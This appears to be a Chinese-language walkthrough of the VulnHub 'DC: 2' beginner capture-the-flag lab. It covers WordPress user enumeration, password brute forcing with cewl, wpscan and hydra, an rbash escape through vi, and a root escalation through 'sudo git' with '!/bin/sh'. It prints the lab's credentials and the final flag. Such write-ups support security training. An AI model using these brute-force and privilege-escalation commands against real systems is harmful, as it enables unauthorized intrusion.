# DC: 2

2024-5-28 https://www.vulnhub.com/entry/dc-2,311/

difficulty: beginners

## IP

192.168.5.28

## Scan

Open Port -> 80,7744

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Did not follow redirect to http://dc-2/
|_http-server-header: Apache/2.4.10 (Debian)
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey:
|   1024 52517b6e70a4337ad24be10b5a0f9ed7 (DSA)
|   2048 5911d8af38518f41a744b32803809942 (RSA)
|   256 df181d7426cec14f6f2fc12654315191 (ECDSA)
|_  256 d9385f997c0d647e1d46f6e97cc63717 (ED25519)
```

根据靶场描述，将 192.168.5.28 dc-2 添加到 /etc/hosts 中。

访问 http://dc-2/ 发现首页是一个 wordpress 网站。gobuster 进行目录扫描：

```
gobuster -t 64 dir -u http://dc-2/ -k -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x php,txt,html -e

```

没有扫描出非 wordpess CMS 自带的连接，这里的漏洞利用点 1 是找到用户名和密码登陆后台，反弹 shell；2 是找到有漏洞的 plugin 进行利用。

wpscan 先搜集下用户名：

```
wpscan --url http://dc-2/ -e u

admin、jerry、tom
```

http://dc-2/index.php/flag/ 中给出了收集密码的提示，使用 cewl:

```
cewl -d 5 http://dc-2/ -w pass.txt
wpscan --url http://dc-2/ -P pass.txt -t 20
```

找到了 2 个用户的密码：

```
Username: jerry, Password: adipiscing
Username: tom, Password: parturient
```

登陆 wordpress 看看哪个用户可以写 php 文件。

得到了 flag2 的提示：

```
Flag 2:

If you can't exploit WordPress and take a shortcut, there is another way.

Hope you found another entry point.
```

发现这两个用户都没有特殊权限，前面还开放了一个 7744 ssh 端口，尝试用 hydra 看看前面得到的 2 个用户凭据，能不能通过 ssh 登陆。

找到 tom 的 ssh 登陆密码：

```
7744][ssh] host: 192.168.5.28   login: tom   password: parturient
```

登陆 ssh，提示 rbash，需要绕过获得完整的命令权限：

```
echo $SHELL
echo $PATH

rbash$ vi
:set shell=/bin/bash
:shell

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

这时能得到一个比较完整的 bash。

vi flag3.txt 得到了 flag3 的内容：

```
Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
```

根据提示，需要使用 su, su jerry 输入 jerry 在 wordpress 上的密码 adipiscing ，成功切换。

vi /home/tom/flag4.txt 得到了 flag4 的内容：

```
Good to see that you've made it this far - but you're not home yet.

You still need to get the final flag (the only flag that really counts!!!).

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!
```

sudo -l 显示：

```
(root) NOPASSWD: /usr/bin/git
```

可以提权至 root:

```
sudo -u root git -p help config
!/bin/sh

root@DC-2:/home/jerry# id
uid=0(root) gid=0(root) groups=0(root)
root@DC-2:/home/jerry# cd /root
root@DC-2:~# ls
final-flag.txt
root@DC-2:~# cat final-flag.txt
 __    __     _ _       _                    _
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/


Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```

最后看一下 ssh_config ,为什么 tom 能够 ssh 远程登陆，而 jerry 不能？

```
cat /etc/ssh/sshd_config

AllowUsers tom   # 只有tom在白名单中
```
